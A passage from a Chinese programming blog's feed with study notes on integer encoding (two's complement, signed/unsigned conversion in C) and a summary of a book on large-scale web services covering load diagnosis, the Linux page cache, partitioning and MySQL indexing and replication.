      &lt;li&gt;&lt;img src=&quot;http://www.forkosh.com/mathtex.cgi?formdata=%255Cusepackage%257Bmathtools%257D%250D%250A%255CSmall+UMax_w%250D%250A%257B%255Coverset%257B%255Cmathrm%257B%255Cbullet%257D%257D%257B%253D%255Cjoinrel%253D%257D%257D%250D%250A%255Csum%255Cnolimits_%257Bi%253D0%257D%255E%257Bw-1%257D2%255Ei%253D2%255Ew-1&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;补码编码
    &lt;ul&gt;
      &lt;li&gt;有符号数最常表示方式就是补码(two’s-complement), 用函数B2T(Binary to two’s-complement)表示：&lt;/li&gt;
      &lt;li&gt;&lt;img src=&quot;http://www.forkosh.com/mathtex.cgi?formdata=%255Cusepackage%257Bmathtools%257D%250D%250A%255CSmall+B2T_w%28%5Cvec%7Bx%7D%29%250D%250A%257B%255Coverset%257B%255Cmathrm%257B%255Cbullet%257D%257D%257B%253D%255Cjoinrel%253D%257D%257D%250D%250A-x_%257Bw-1%257D2%255E%257Bw-1%257D%252B%255Csum_%257Bi%253D0%257D%255E%257Bw-2%257Dx_i2%255Ei&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
      &lt;li&gt;最小值是位向量[10…0]的值：&lt;/li&gt;
      &lt;li&gt;&lt;img src=&quot;http://www.forkosh.com/mathtex.cgi?formdata=%255Cusepackage%257Bmathtools%257D%250D%250A%255CSmall+TMin_w%250D%250A%257B%255Coverset%257B%255Cmathrm%257B%255Cbullet%257D%257D%257B%253D%255Cjoinrel%253D%257D%257D%250D%250A-2%255E%257Bw-1%257D&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
      &lt;li&gt;最大值是位向量[010…0]的值：&lt;/li&gt;
      &lt;li&gt;&lt;img src=&quot;http://www.forkosh.com/mathtex.cgi?formdata=%255Cusepackage%257Bmathtools%257D%250D%250A%255CSmall+TMax_w%250D%250A%257B%255Coverset%257B%255Cmathrm%257B%255Cbullet%257D%257D%257B%253D%255Cjoinrel%253D%257D%257D%250D%250A%255Csum%255Cnolimits_%257Bi%253D0%257D%255E%257Bw-2%257D%253D2%255E%257Bw-1%257D-1&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
      &lt;li&gt;反码(Ones’ Complement): 除了最高有效位的权， 和补码一样：&lt;/li&gt;
      &lt;li&gt;&lt;img src=&quot;http://www.forkosh.com/mathtex.cgi?formdata=%255Cusepackage%257Bmathtools%257D%250D%250A%255CSmall+B2O_w%250D%250A%257B%255Coverset%257B%255Cmathrm%257B%255Cbullet%257D%257D%257B%253D%255Cjoinrel%253D%257D%257D%250D%250A-x_%257Bw-1%257D%25282%255E%257Bw-1%257D-1%2529%252B%255Csum_%257Bi%253D0%257D%255E%257Bw-2%257Dx_i2%255Ei&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
      &lt;li&gt;原码(Sign-Magnitude): 最高有效位是符号位， 用来确定负权还是正权：&lt;/li&gt;
      &lt;li&gt;&lt;img src=&quot;http://www.forkosh.com/mathtex.cgi?formdata=%255Cusepackage%257Bmathtools%257D%250D%250A%255CSmall+B2S_w%250D%250A%257B%255Coverset%257B%255Cmathrm%257B%255Cbullet%257D%257D%257B%253D%255Cjoinrel%253D%257D%257D%250D%250A%2528-1%2529%255E%257Bx_%257Bw-1%257D%257D%250D%250A%255Cleft%2528+%255Csum_%257Bi%253D0%257D%255E%257Bw-2%257Dx_i2%255Ei+%255Cright%2529&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;有符号数和无符号数之间的转换
    &lt;ul&gt;
      &lt;li&gt;数值可能会改变，但是位模式不变。&lt;/li&gt;
      &lt;li&gt;B2U和B2T都是双射， 就有明确的逆映射。&lt;/li&gt;
      &lt;li&gt;函数U2T描述了从无符号数到补码的转换， 而T2U描述的是补码到无符号的转换&lt;/li&gt;
      &lt;li&gt;&lt;img src=&quot;http://www.forkosh.com/mathtex.cgi?formdata=%255Cusepackage%257Bmathtools%257D%250D%250A%255CSmall+B2U_x%2528%255Cvec%257Bx%257D%2529-B2T_w%2528%255Cvec%257Bx%257D%2529%250D%250A%253D%250D%250Ax_%257Bw-1%257D%25282%255E%257Bw-1%257D--2%255E%257B2-1%257D%2529%253Dx_%257Bw-1%257D2%255Ew&quot; alt=&quot;&quot; /&gt; ，如果令&lt;img src=&quot;http://www.forkosh.com/mathtex.cgi?formdata=%255Cusepackage%257Bmathtools%257D%250D%250A%255CSmall+%255Cvec%257Bx%257D%253DT2B_w%2528x%2529&quot; alt=&quot;&quot; /&gt;：&lt;/li&gt;
      &lt;li&gt;&lt;img src=&quot;http://www.forkosh.com/mathtex.cgi?formdata=%255Cusepackage%257Bmathtools%257D%250D%250A%255CSmall+B2U_w%2528T2B_w%2528%257Bx%257D%2529%2529%253DT2U_w%2528x%2529%253Dx_%257Bw-1%257D2%255Ew%252Bx&quot; alt=&quot;&quot; /&gt;， 得到：&lt;/li&gt;
      &lt;li&gt;&lt;img src=&quot;http://www.forkosh.com/mathtex.cgi?formdata=%255Cusepackage%257Bmathtools%257D%250D%250A%255CSmall%250D%250AT2U_w%2528x%2529%253D%255Cleft%255C%257B+%257Bx%252Bw%255E2%252C+x%253C0%257D+%255Catop+x%252C+x%253E%253D0%255Cright&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
      &lt;li&gt;推导一个无符号树u和与之对应的有符号数U2T(u)之间的关联。设&lt;img src=&quot;http://www.forkosh.com/mathtex.cgi?formdata=%255Cusepackage%257Bmathtools%257D%250D%250A%255CSmall%250D%250A%255Cvec%257Bu%257D%253DU2B_w%2528u%2529&quot; alt=&quot;&quot; /&gt;：&lt;/li&gt;
      &lt;li&gt;&lt;img src=&quot;http://www.forkosh.com/mathtex.cgi?formdata=%255Cusepackage%257Bmathtools%257D%250D%250A%255CSmall%250D%250AB2T_w%2528U2B_w%2528u%2529%2529%253DU2T_w%2528u%2529%253D-u_%257Bw-1%257D2%255Ew%252Bu&quot; alt=&quot;&quot; /&gt;， 得到：&lt;/li&gt;
      &lt;li&gt;&lt;img src=&quot;http://www.forkosh.com/mathtex.cgi?formdata=%255Cusepackage%257Bmathtools%257D%250D%250A%255CSmall%250D%250AU2T_w%2528u%2529%253D%255Cleft%255C%257Bu%252C%255C+u%253C2%255E%257Bw-1%257D%255Catop+u-2%255Ew%252C%255C+u%255Cgeq2%255E%257Bw-1%257D%255Cright&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;C语言中的有符号数与无符号数
    &lt;ul&gt;
      &lt;li&gt;C语言支持所有整形数据类型的有符号和无符号运算， 转换的规则是底层的位表示不变&lt;/li&gt;
      &lt;li&gt;有符号数和无符号数运算时， C语言隐式地将有符号数强制转换为无符号数&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;扩展一个数字的位表示
    &lt;ul&gt;
      &lt;li&gt;在不同字长的整数之间转换， 同时又保持数值不变&lt;/li&gt;
      &lt;li&gt;将一个无符号数转换为一个更大的数据类型， 只需简单地在表示的开头添加0, 这种运算称为零扩展(zero extension)&lt;/li&gt;
      &lt;li&gt;将一个补码数字转换为一个更大的数据类型， 在表示中添加最高有效位的值的副本， 称为符号扩展(sign extension)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;截断数字&lt;/li&gt;
  &lt;li&gt;关于有符号数与无符号数的建议
    &lt;ul&gt;
      &lt;li&gt;有符号数到无符号数的隐式强制类型转换导致了某些非直观的行为，避免这类错误的一种方法就是绝不使用无符号数&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h1 id=&quot;第3章-程序的机器表级示&quot;&gt;第3章 程序的机器表级示&lt;/h1&gt;

&lt;p&gt;计算机执行机器代码， 用字节序列编码低级的操作。&lt;/p&gt;

&lt;h2 id=&quot;历史观点&quot;&gt;历史观点&lt;/h2&gt;

&lt;p&gt;Linux使用了平坦寻址（flat addressing), 使程序员将整个存储空间看做一个大的字节数组。&lt;/p&gt;

&lt;h2 id=&quot;程序编码&quot;&gt;程序编码&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;机器级代码&lt;/li&gt;
&lt;/ol&gt;
</content>
 </entry>
 
 <entry>
   <title>大规模Web服务开发技术</title>
   <link href="http://yanpeipan.github.io/2015/02/26/%E5%A4%A7%E8%A7%84%E6%A8%A1Web%E6%9C%8D%E5%8A%A1%E5%BC%80%E5%8F%91%E6%8A%80%E6%9C%AF.html"/>
   <updated>2015-02-26T00:00:00+08:00</updated>
   <id>http://yanpeipan.github.io/2015/02/26/大规模Web服务开发技术</id>
   <content type="html">
&lt;hr /&gt;

&lt;h1 id=&quot;大规模web服务的开发定位掌握整体&quot;&gt;大规模Web服务的开发定位——掌握整体&lt;/h1&gt;

&lt;h2 id=&quot;大规模和小规模服务&quot;&gt;大规模和小规模服务&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Alexa排名&lt;/li&gt;
  &lt;li&gt;服务规模可以大致通过服务器数量来把握， 从这个观点来说， 上百台至几千台左右可以称为大规模。&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;小规模服务和大规模服务的区别&quot;&gt;小规模服务和大规模服务的区别&lt;/h4&gt;

&lt;ol&gt;
  &lt;li&gt;保证可扩展性， 负载均衡的必要性
    &lt;ul&gt;
      &lt;li&gt;横向扩展（scale out）：通过增加服务器数量来提高系统整体的处理能力并分担负载。&lt;/li&gt;
      &lt;li&gt;纵向扩展（scale up）：通过提高硬件性能来提高处理能力。&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;保证冗余性&lt;/li&gt;
  &lt;li&gt;低成本运维的重要性&lt;/li&gt;
  &lt;li&gt;开发人数和开发方法的变化&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;应对大规模数据量&quot;&gt;应对大规模数据量&lt;/h3&gt;

&lt;p&gt;现代计算机的特点， 就是各层之间的速度差异非常大。即使操作系统和中间件再努力，也是有极限的。数据量增大， 就会经常发生缓存不命中， 结果就要多次访问低速磁盘。进入磁盘I/O（输入输出）等待队列的程序在等待读取完成之时，即使其他资源空闲， 也无法进行下一步处理。这就会导致系统整体的速度下降。&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;持续增长的服务和大规模化的障碍&quot;&gt;持续增长的服务和大规模化的障碍&lt;/h2&gt;

&lt;h3 id=&quot;系统增长战略最小化开端-预见变化的管理和设计&quot;&gt;系统增长战略——最小化开端， 预见变化的管理和设计&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;事先考虑到未来系统规模会变大，从而一开始就建立完善的负载均衡系统的话，成本实在是太高了。&lt;/li&gt;
  &lt;li&gt;不假思索地开始也是欠考虑的。数据规模增大引起的I/O负载上升并不是平滑增加。从缓存不命中开始只需片刻， 问题就会急剧显露出来， 引起人们注意时， 系统速度就已经开始下降了——这种事情是极其常见的。&lt;/li&gt;
  &lt;li&gt;最小化开端， 在关键的地方为将来的增长做好规划， 又不致花费过多的开销。&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;大规模数据处理入门内存和磁盘web应用程序和负载&quot;&gt;大规模数据处理入门——内存和磁盘，Web应用程序和负载&lt;/h1&gt;

&lt;h2 id=&quot;大规模数据处理的难点内存和磁盘&quot;&gt;大规模数据处理的难点——内存和磁盘&lt;/h2&gt;

&lt;h3 id=&quot;为何处理大规模数据如此困难因为无法在内存中计算&quot;&gt;为何处理大规模数据如此困难——因为无法在内存中计算&lt;/h3&gt;

&lt;p&gt;无法在内存中计算的话， 就必须搜索磁盘上的数据， 但是磁盘十分缓慢， I/O十分耗费时间。&lt;/p&gt;

&lt;h3 id=&quot;内存和磁盘的速度差异内存要快105-106倍&quot;&gt;内存和磁盘的速度差异——内存要快10^5-10^6倍&lt;/h3&gt;

&lt;p&gt;内存比磁盘快10w-100w倍。&lt;/p&gt;

&lt;h3 id=&quot;操作系统层的加速处理&quot;&gt;操作系统层的加速处理&lt;/h3&gt;

&lt;p&gt;操作系统将连续的数据放在同一处， 一次性读取4KB（kilobytes）左右。其结果就是将磁盘旋转次数降到最低。这种处理尽量减少磁盘旋转。尽管如此， 旋转一次也需要花费毫秒级，所以与内存的速度差异还是不可避免的。&lt;/p&gt;

&lt;h3 id=&quot;传输速度和总线的速度差异&quot;&gt;传输速度和总线的速度差异&lt;/h3&gt;

&lt;p&gt;内存的搜索速度是磁盘的10^5-10^6倍以上， 不论内存还是磁盘， 都用总线与CPU连接。 这些总线的传输速度也有差异。连接内存和CPU的总线相当快，能达到7.5G/s， 但磁盘只能达到58M/s。SSD（solid State Drive， 固态硬盘）不需要物理旋转即可进行高速搜索， 但由于总线速度的瓶颈以及其他结构的影响， 其速度还是无法与内存相比。&lt;/p&gt;

&lt;p&gt;在现代计算机上编写应用程序时， 必须考虑到内存和磁盘的速度差异。这是考虑可扩展性（scalability)时及其主要的一点， 也是非常困难的一点。&lt;/p&gt;

&lt;h3 id=&quot;不要推测-要测量将一台服务器的性能发挥到极致&quot;&gt;不要推测， 要测量——将一台服务器的性能发挥到极致&lt;/h3&gt;

&lt;p&gt;负载均衡也不例外。通过测量找出系统的瓶颈，然后努力消除瓶颈以发挥性能。&lt;/p&gt;

&lt;h3 id=&quot;寻找瓶颈的基本流程&quot;&gt;寻找瓶颈的基本流程&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;查看平均负载（load average）&lt;/li&gt;
  &lt;li&gt;确认CPU，I/O有无瓶颈&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;查看平均负载&quot;&gt;查看平均负载&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;首先， 确认负载的第一步就是top， uptime等命令显示的平均负载（load average）。但是， 仅通过平均负载是无法判断瓶颈原因的。 应该从平均负载数值处着手， 开始调查瓶颈。&lt;/li&gt;
  &lt;li&gt;负载很低， 但系统的吞吐量无法提高的现象也时有发生。这种情况下应该检查软件设置是否正常， 检查网络和远程主机是否存在故障。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;查找cpu和io的瓶颈&quot;&gt;查找CPU和I/O的瓶颈&lt;/h3&gt;

&lt;p&gt;平均负载过高时， 要在CPU或者I/O中寻找原因。sar或vmstate可以查看CPU使用情况和I/O等待率随着时间的推移情况，作为参考。&lt;/p&gt;

&lt;p&gt;“CPU负载”过高时， 用以下流程寻找原因：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;确认是用户程序处理的瓶颈，还是系统程序的原因&lt;/li&gt;
  &lt;li&gt;再通过ps可查看进程的状态和CPU使用时间等， 确定导致问题的进程&lt;/li&gt;
  &lt;li&gt;确定进程之后， 想要进一步寻找原因的话， 可以通过strace追踪， 或oprofile进行刨测， 以确定瓶颈所在。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;“I/O负载”过高， 多半是程序发出的I/O请求过多导致负载过高， 或是发生页面交换导致频繁访问磁盘。&lt;/p&gt;

&lt;p&gt;如果是发生页面交换的情况， 应该从以下几点着手调查：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;用Ps确认是否有进程消耗了大量的内存&lt;/li&gt;
  &lt;li&gt;如果由于程序故障造成内存消耗过大， 应改进程序&lt;/li&gt;
  &lt;li&gt;如果是因为内存不足， 就要增加内存。 无法增加内存时考虑分布式。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;如果是没有交换发生， 而且磁盘I/O频繁的情况， 可能是用于缓存的内存不足。 根据服务器拥有的数据量和可增加的内存量， 按照一下步骤选择应对方法：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;如果通过增加内存可以扩大缓存， 就增加内存&lt;/li&gt;
  &lt;li&gt;如果增加内存还不够用， 就考虑分散存储数据， 或增加缓存服务器等。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;操作系统调优-就是找出负载原因并去除之&quot;&gt;操作系统调优， 就是找出负载原因并去除之&lt;/h3&gt;

&lt;p&gt;调优的真正含义是 “找到瓶颈并去除之”&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;可扩展性的要点&quot;&gt;可扩展性的要点&lt;/h2&gt;

&lt;h3 id=&quot;扩展和可扩展性&quot;&gt;扩展和可扩展性&lt;/h3&gt;

&lt;p&gt;将大量廉价的， 性能一般的硬件放在一起以提升系统性能的“横向扩展”（scale out）方案流行。因为它更适合大多数Web服务，虽然原因多种多样，但价格低廉和系统结构灵活是最重要的原因。&lt;/p&gt;

&lt;h3 id=&quot;可扩展性的要点cpu负载和io负载&quot;&gt;可扩展性的要点——CPU负载和I/O负载&lt;/h3&gt;

&lt;p&gt;代理服务器或应用服务器，基本上只消耗CPU。相反，数据库服务器需要较多I/O资源。&lt;/p&gt;

&lt;h3 id=&quot;web应用程序和负载的关系&quot;&gt;Web应用程序和负载的关系&lt;/h3&gt;

&lt;p&gt;CPU负载服务器， 只须增加与原有服务器结构完全相同的服务器， 负载均衡器（load balancer）负责均匀的分发请求， 这样就OK了。&lt;/p&gt;

&lt;h3 id=&quot;数据库的可扩展性很难保证&quot;&gt;数据库的可扩展性很难保证&lt;/h3&gt;

&lt;p&gt;大规模环境中产生I/O负载的服务器本来就很难分散， 再加上频繁产生的磁盘I/O， 很容易导致服务器变慢， 这才是本质的问题。&lt;/p&gt;

&lt;h3 id=&quot;两种负载与web应用程序&quot;&gt;两种负载与Web应用程序&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;CPU负载 程序的处理速度依赖于CPU的计算速度。也称为“计算密集型程序”（CPU bound）&lt;/li&gt;
  &lt;li&gt;I/O负载 程序的处理速度依赖于磁盘的读取速度， 即依赖于输入/输出。这种给I/O加上负载的程序成为“I/O密集型程序”&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;多任务操作系统和负载&quot;&gt;多任务操作系统和负载&lt;/h3&gt;

&lt;p&gt;top的输出结果包含为“load average”（平均负载）的数字。平均负载从左到右分别为1分钟，5分钟， 15分钟内单位时间中处于等待状态的任务数。平均负载高， 说明有相应数量的任务在等待， 可以认为运行有延迟， 也就是负载过高。&lt;/p&gt;

&lt;h3 id=&quot;平均负载揭示的实际负载状况&quot;&gt;平均负载揭示的实际负载状况&lt;/h3&gt;

&lt;p&gt;硬件每隔一定周期给CPU发送中断信号。每次发生中断时， CPU就会进行与时间相关的处理。平均负载就是在每次定时器中断（Timer Interrupt）发生时计算的。&lt;/p&gt;

&lt;p&gt;平均负载中的负载的意思就是：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;等待赋予CPU的执行权限的进程&lt;/li&gt;
  &lt;li&gt;等待磁盘I/O完成的进程&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;平均负载本身是将两种负载综合的结果， 单凭该数字无法判断是CPU负载高， 还是I/O负载高。&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;处理大规模数据的基础知识&quot;&gt;处理大规模数据的基础知识&lt;/h2&gt;

&lt;h3 id=&quot;面向程序员的大规模数据的基础&quot;&gt;面向程序员的大规模数据的基础&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;处理大规模数据的三个重点——写程序的技巧
    &lt;ul&gt;
      &lt;li&gt;能在内存中完成多少？ 将磁盘寻道次数降到最低。实现分布式， 有效利用局部性。&lt;/li&gt;
      &lt;li&gt;能应对数据量增加的算法和数据结构 例如：线性搜索-&amp;gt;二叉树搜索&lt;/li&gt;
      &lt;li&gt;数据压缩， 信息搜索技术&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;处理大规模数据之前的三大前提知识——程序开发的底层基础
    &lt;ul&gt;
      &lt;li&gt;操作系统的缓存&lt;/li&gt;
      &lt;li&gt;以分布式为前提的RDBMS应用&lt;/li&gt;
      &lt;li&gt;算法和数据结构&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;平均负载之后是cpu使用率和io等待率&quot;&gt;平均负载之后是CPU使用率和I/O等待率&lt;/h3&gt;

&lt;p&gt;负载过大而导致性能下降的原因绝大多数都是CPU或I/O某个出了问题， 可以按照以下方法调查哪个出了问题。&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;通过sar查看CPU使用率和I/O等待率 &lt;code&gt;%user&lt;/code&gt;是CPU在用户模式下的使用率， &lt;code&gt;%system&lt;/code&gt;为系统模式下的使用率&lt;/li&gt;
  &lt;li&gt;I/O密集型场合的sar状态 &lt;code&gt;%iowait&lt;/code&gt; 是I/O等待率&lt;/li&gt;
  &lt;li&gt;多CPU与CPU使用率 &lt;code&gt;sar -P ALL&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;操作系统的缓存和分布式高效处理大规模数据的原则&quot;&gt;操作系统的缓存和分布式——高效处理大规模数据的原则&lt;/h1&gt;

&lt;h2 id=&quot;操作系统的缓存机制&quot;&gt;操作系统的缓存机制&lt;/h2&gt;

&lt;h3 id=&quot;在理解操作系统缓存的基础上编写应用程序页面缓存&quot;&gt;在理解操作系统缓存的基础上编写应用程序——页面缓存&lt;/h3&gt;

&lt;p&gt;Linux上有页面缓存（page cache），文件缓存（file cache），缓存区缓存（buffer cache）这些机制。&lt;/p&gt;

&lt;h3 id=&quot;虚拟内存机制&quot;&gt;虚拟内存机制&lt;/h3&gt;

&lt;p&gt;由于操作系统将物理硬件抽象化， 因此才产生了虚拟内存。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;具有让进程更容易地访问内存等好处&lt;/li&gt;
  &lt;li&gt;操作系统在内核中将内存抽象化&lt;/li&gt;
  &lt;li&gt;操作系统以页面为单位分配物理内存并管理&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;linux页面缓存原理&quot;&gt;Linux页面缓存原理&lt;/h3&gt;

&lt;p&gt;内核分配过的内存不会释放， 而是一直保留下来（即页面缓存）&lt;/p&gt;

&lt;h3 id=&quot;vfs&quot;&gt;VFS&lt;/h3&gt;

&lt;p&gt;磁盘缓存就是像这样由页面缓存实现的， 但实际上操作磁盘的设备驱动程序和操作系统之间还夹着一层文件系统VFS（Virtual File System， 虚拟文件系统）， 负责将不同实现方式的文件系统抽象化。&lt;/p&gt;

&lt;h3 id=&quot;linux以页面为单位缓存磁盘&quot;&gt;Linux以页面为单位缓存磁盘&lt;/h3&gt;

&lt;p&gt;操作系统以块为单位读出缓存的内存， 所以只能对文件某一部分， 或读出部分缓存。&lt;/p&gt;

&lt;p&gt;页面=虚拟内存的最小单位&lt;/p&gt;

&lt;p&gt;LRU(Least Recently Used)， 放弃最老的内容， 留下最新的内容。&lt;/p&gt;

&lt;p&gt;Linux使用inode编号来识别文件， 以文件的inode编号和表示内容在文件中位置的偏移量两个值作为键进行缓存。操作系统内部使用了名为Radix Tree的数据结构， 保证缓存的搜索速度不会降低。&lt;/p&gt;

&lt;h3 id=&quot;内存空闲时就缓存通过sar确认&quot;&gt;内存空闲时就缓存——通过sar确认&lt;/h3&gt;

&lt;p&gt;Linux会把全部空闲内存用于缓存， 通过&lt;code&gt;sar -r&lt;/code&gt;。&lt;code&gt;kbcached&lt;/code&gt;为&lt;code&gt;kilo byte cached&lt;/code&gt;的省略， 即用于缓存的容量。&lt;/p&gt;

&lt;h3 id=&quot;增加内存降低io负载&quot;&gt;增加内存降低I/O负载&lt;/h3&gt;

&lt;h3 id=&quot;页面缓存是透明的&quot;&gt;页面缓存是透明的&lt;/h3&gt;

&lt;h2 id=&quot;降低io负载的策略&quot;&gt;降低I/O负载的策略&lt;/h2&gt;

&lt;h3 id=&quot;以缓存为前提的降低io负载的策略&quot;&gt;以缓存为前提的降低I/O负载的策略&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;如果数据规模小于物理内存， 就全部缓存;
    &lt;ul&gt;
      &lt;li&gt;以缓存为前提的降低I/O负载的策略是有效的&lt;/li&gt;
      &lt;li&gt;大规模数据处理时数据压缩很重要， 比如一般的压缩算法如LZ算法等， 对于文本文件能压缩到一半左右&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;考虑与经济成本的平衡性
    &lt;ul&gt;
      &lt;li&gt;选择性能上最为经济的服务器&lt;/li&gt;
      &lt;li&gt;硬件成本突然增加时，改进软件更合适&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;扩展到多台服务器无法全部缓存的情况&quot;&gt;扩展到多台服务器——无法全部缓存的情况&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;CPU负载分散只需简单的增加&lt;/li&gt;
  &lt;li&gt;I/O分散需要考虑局部性&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;单纯增加数量无法保证可扩展性&quot;&gt;单纯增加数量无法保证可扩展性&lt;/h3&gt;

&lt;p&gt;无法缓存的比例依然不变， 立即再次成为瓶颈&lt;/p&gt;

&lt;h3 id=&quot;降低io负载和页面缓存&quot;&gt;降低I/O负载和页面缓存&lt;/h3&gt;

&lt;p&gt;Linux以4KB的小块来管理内存空间， 这种4KB的块成为“页面”。&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;页面缓存起到的降低I/O负载的效果&lt;/li&gt;
  &lt;li&gt;要先读取一次磁盘才会页面缓存&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;利用局部性的分布式&quot;&gt;利用局部性的分布式&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;根据访问模式实施分布式&lt;/li&gt;
  &lt;li&gt;不再有无法缓存的数据&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;partitioning考虑局部性的分布式&quot;&gt;Partitioning——考虑局部性的分布式&lt;/h3&gt;

&lt;p&gt;Partitioning  就是将一个数据库分割到多台服务器上。&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;以RDBMS的表为单位分割&lt;/li&gt;
  &lt;li&gt;从数据中间分割&lt;/li&gt;
  &lt;li&gt;根据用途将系统分成不同的“岛”&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;根据访问模式分割成岛考虑局部性的分布式&quot;&gt;根据访问模式分割成“岛”——考虑局部性的分布式&lt;/h3&gt;

&lt;p&gt;一般请求， 爬虫和图像分别分到不同的“岛”上。&lt;/p&gt;

&lt;h3 id=&quot;以页面缓存为前提的基本应用规则&quot;&gt;以页面缓存为前提的基本应用规则&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;操作系统刚启动时不要将服务器投入到生产环境&lt;/li&gt;
  &lt;li&gt;性能测试要在缓存优化后进行&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;数据库的横向扩展策略以分布式为基础的mysql应用&quot;&gt;数据库的横向扩展策略——以分布式为基础的MySQL应用&lt;/h1&gt;

&lt;h2 id=&quot;正确应用索引分布式mysql应用的打前提&quot;&gt;正确应用索引——分布式MySQL应用的打前提&lt;/h2&gt;

&lt;h3 id=&quot;分布式mysql应用的三大要点&quot;&gt;分布式MySQL应用的三大要点&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;灵活应用操作系统缓存&lt;/li&gt;
  &lt;li&gt;正确设置索引&lt;/li&gt;
  &lt;li&gt;以横向扩展为前提的设计&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;灵活应用操作系统缓存&quot;&gt;灵活应用操作系统缓存&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;考虑全部数据量
    &lt;ul&gt;
      &lt;li&gt;保持数据量小于物理内存&lt;/li&gt;
      &lt;li&gt;内存不足时增加内存等&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;考虑表结构设计对数据大小的影响（亿条数据， 表结构稍有错误， 数据量就会以GB为单位增减）&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;索引的重点b树&quot;&gt;索引的重点——B树&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;index=索引&lt;/li&gt;
  &lt;li&gt;B+树
    &lt;ul&gt;
      &lt;li&gt;搜索外部存储设备时能将寻道次数最小化的树结构（可以将各节点的大小设定在一个合适的范围内——4KB左右&lt;/li&gt;
      &lt;li&gt;搜索复杂度：O(n) -&amp;gt; O(logn)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;索引的效果&quot;&gt;索引的效果&lt;/h3&gt;

&lt;p&gt;不仅能改善复杂度， 还能改善磁盘寻道次数。这是B树与其他复杂度同样是O（logn)的树的区别&lt;/p&gt;

&lt;h3 id=&quot;确认索引是否有效的方法explain命令&quot;&gt;确认索引是否有效的方法——explain命令&lt;/h3&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;mysql的分布式以扩展为前提的系统设计&quot;&gt;MySQL的分布式——以扩展为前提的系统设计&lt;/h2&gt;

&lt;h3 id=&quot;mysql的replication功能&quot;&gt;MySQL的replication功能&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;master/slave的架构&lt;/li&gt;
  &lt;li&gt;查询发给slave， 更新发给master
    &lt;ul&gt;
      &lt;li&gt;通过ORM来控制&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

